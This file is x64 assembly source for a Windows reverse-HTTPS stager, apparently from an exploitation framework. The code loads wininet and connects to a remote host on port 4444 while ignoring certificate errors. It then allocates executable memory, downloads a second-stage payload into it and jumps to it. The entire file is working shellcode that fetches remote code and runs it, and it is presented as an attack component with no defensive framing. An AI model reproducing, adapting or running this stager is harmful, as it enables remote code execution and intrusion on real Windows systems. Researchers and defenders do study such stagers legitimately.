;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Rewritten for x64 by agix
; Modified to account for memory alignment by rwincey
; Compatible: Windows 7
; Architecture: x64
;-----------------------------------------------------------------------------;
[BITS 64]

; Input: RBP must be the address of 'api_call'.
; Output: RDI will be the socket for the connection to the server
; Clobbers: RAX, RCX, RDX, RDI, R8, R9, R10, R12, R13, R14, R15

load_wininet:
  ; setup the structures we need on the stack...
  push byte 0            ; alignment
  mov r14, 'wininet'
  push r14               ; Push the bytes 'wininet',0 onto the stack.
  mov r14, rsp           ; save pointer to the "wininet" string for LoadLibraryA call.
  mov rcx, r14           ; set the param for the library to load
  mov r10, 0x0726774C    ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               ; LoadLibraryA( "ws2_32" )

internetopen:
  push byte 0            ; alignment
  push byte 0            ; NULL pointer
  mov rcx, rsp           ; LPCTSTR lpszAgent ("\x00")
  xor rdx, rdx           ; DWORD dwAccessType (PRECONFIG = 0)
  xor r8, r8             ; LPCTSTR lpszProxyName
  xor r9, r9             ; LPCTSTR lpszProxyBypass
  push r8                ; DWORD dwFlags
  push r8                ; alignment
  mov r10, 0xA779563A    ; hash( "wininet.dll", "InternetOpenA" )
  call rbp

  jmp dbl_get_server_host

internetconnect:
  pop rdx                ; LPCTSTR lpszServerName
  mov rcx, rax           ; HINTERNET hInternet
  mov r8, 4444           ; PORT
  xor r9, r9             ; LPCTSTR lpszUsername
  push r9                ; DWORD_PTR dwContext (NULL)
  push r9                ; DWORD dwFlags
  push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
  push r9                ; alignment
  mov r10, 0xC69F8957    ; hash( "wininet.dll", "InternetConnectA" )
  call rbp

  jmp get_server_uri

httpopenrequest:
  mov rcx, rax           ; HINTERNET hConnect
  xor rdx, rdx           ; LPCTSTR lpszVerb
  pop r8                 ; LPCTSTR lpszObjectName
  xor r9, r9             ; LPCTSTR lpszVersion
  push rdx               ; DWORD_PTR dwContext
  push qword (0x0000000080000000 | 0x0000000004000000 | 0x0000000000800000 | 0x0000000000200000 | 0x0000000000001000 |0x0000000000002000 |0x0000000000000200) ; dwFlags
    ;0x80000000 |        ; INTERNET_FLAG_RELOAD
    ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
    ;0x00800000 |        ; INTERNET_FLAG_SECURE
    ;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
    ;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
    ;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
    ;0x00000200          ; INTERNET_FLAG_NO_UI
  push rdx               ; LPCTSTR *lplpszAcceptTypes
  push rdx               ; LPCTSTR lpszReferer
  mov r10, 0x3B2E55EB    ; hash( "wininet.dll", "HttpOpenRequestA" )
  call rbp
  mov rsi, rax

retry:
  push byte 10
  pop rdi

; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
internetsetoption:
  mov rcx, rsi           ; HINTERNET hInternet
  mov rdx, 31            ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
  push byte 0            ; alignment
  push qword 0x00003380
    ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
    ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
    ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
    ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
    ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
  mov r8, rsp
  mov r9, 4              ; sizeof(dwFlags)
  mov r10, 0x869E4675    ; hash( "wininet.dll", "InternetSetOptionA" )
  call rbp

httpsendrequest:
  mov rcx, rsi           ; HINTERNET hRequest
  xor rdx, rdx           ; LPCTSTR lpszHeaders
  xor r8, r8             ; DWORD dwHeadersLength
  xor r9, r9             ; LPVOID lpOptional
  push rdx               ; alignment
  push rdx               ; DWORD dwOptionalLength
  mov r10, 0x7B18062D    ; hash( "wininet.dll", "HttpSendRequestA" )
  call rbp
  test eax,eax
  jnz short allocate_memory

try_it_again:
  dec rdi
  jz failure
  jmp short internetsetoption

dbl_get_server_host:
  jmp get_server_host

get_server_uri:
  call httpopenrequest

server_uri:
 db "/12345", 0x00

failure:
  mov r14, 0x56A2B5F0    ; hardcoded to exitprocess for size
  call rbp

allocate_memory:
  xor rcx, rcx           ; LPVOID lpAddress
  mov rdx, 0x00400000    ; SIZE_T dwSize
  mov r8, 0x1000         ; DWORD flAllocationType(MEM_COMMIT)
  mov r9, 0x40           ; DWORD flProtect(PAGE_EXECUTE_READWRITE)
  mov r10, 0xE553A458    ; hash( "kernel32.dll", "VirtualAlloc" )
  call rbp

download_prep:
  xchg rax, rbx          ; place the allocated base address in ebx
  push rbx               ; store a copy of the stage base address on the stack
  push rbx               ; temporary storage for bytes read count
  mov rdi, rsp           ; &bytesRead

download_more:
  mov rcx, rsi           ; HINTERNET hFile
  mov rdx, rbx           ; LPVOID lpBuffer
  mov r8, 8192           ; DWORD dwNumberOfBytesToRead
  mov r9, rdi            ; LPDWORD lpdwNumberOfBytesRead
  mov r10, 0xE2899612    ; hash( "wininet.dll", "InternetReadFile" )
  call rbp
  add rsp, 32            ; clean reserverd space

  test eax,eax           ; download failed? (optional?)
  jz failure

  mov ax, word [edi]
  add rbx, rax           ; buffer += bytes_received

  test rax,rax           ; optional?
  jnz download_more      ; continue until it returns 0
  pop rax                ; clear the temporary storage
  pop rax                ; f*cking alignment

execute_stage:
  ret                    ; dive into the stored stage address

get_server_host:
  call internetconnect

server_host:

